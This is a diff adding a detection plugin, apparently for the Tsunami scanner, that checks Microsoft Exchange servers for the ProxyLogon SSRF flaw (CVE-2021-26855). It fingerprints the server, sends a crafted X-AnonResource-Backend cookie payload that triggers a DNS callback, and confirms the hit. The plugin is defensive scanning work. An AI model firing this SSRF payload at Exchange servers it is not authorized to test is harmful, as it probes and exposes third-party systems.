@@ -1,0 +1,93 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MicrosoftExchange_CVE_2021_26855"
+  author: "Robert Dick (robert@doyensec.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2021-26855"
+  }
+  severity: CRITICAL
+  title: "Microsoft Exchange ProxyLogon SSRF and RCE (CVE-2021-26855)"
+  description: "Due to mishandling of cookies and headers in the Microsoft Exchange Server, Server-Side Request Forgery and Remote Code Execution are possible (ProxyLogon)."
+  recommendation: "Update the Microsoft Exchange Server to the latest version."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2021-26855"
+  }
+}
+
+###########
+# ACTIONS #l
+###########
+
+actions: {
+  name: "fingerprint_exchange"
+  http_request: {
+    method: GET
+    uri: "/"
+    client_options: {
+      disable_follow_redirects: true
+      ignore_http_client_errors: true
+    },
+    response:{
+        expect_all: {
+            conditions: [
+                { header: { name: "Location" } contains: "/owa/" }
+            ]
+        }
+    }
+  }
+}
+
+actions: {
+  name: "test_ssrf"
+  http_request: {
+    method: GET
+    uri: "/owa/auth/x.js"
+    headers: [
+      { name: "Cookie" value: "{{ PAYLOAD }}" }
+    ]
+    client_options: {
+      disable_follow_redirects: true
+      ignore_http_client_errors: true
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_DNS_CALLBACK_SERVER
+  variables: [
+    { name: "PAYLOAD", value: "X-AnonResource=true; X-AnonResource-Backend=tsunami]@{{ T_CBS_DNS }}/#~1" }
+  ],
+  actions: [
+    "fingerprint_exchange",
+    "test_ssrf",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
